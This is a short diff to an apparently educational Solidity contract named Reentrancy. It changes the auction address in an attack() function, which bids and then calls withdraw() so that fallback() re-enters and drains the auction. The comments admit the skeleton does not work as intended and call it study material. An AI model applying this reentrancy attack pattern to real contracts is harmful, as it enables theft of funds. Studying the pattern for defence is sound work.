@@ -95,7 +95,7 @@ contract Reentrancy {
     function attack() external payable {
         require(msg.value >= 3 ether); // Requirement for amount to have in order to continue the attack (in wei).
         // bid function asks for address that will send wei
-        housingauction.bid(0x5eE6f92c8872f7b4f5974754A0c7c3596e2F2161);
+        housingauction.bid(0x5Ab6671Fb5D8218B437CDD98A0b5ea5633cEa40A); // Potential solution to error: Enter the auction address and AFTER DEPLOYMENT, use fallback instead of the attach function.
         // Now, withdraw the funds. In doing so, the fallback() function will be triggered
         housingauction.withdraw(); // Doesn't work like intended but the skeleton is here for studying and a potential fix *
     }
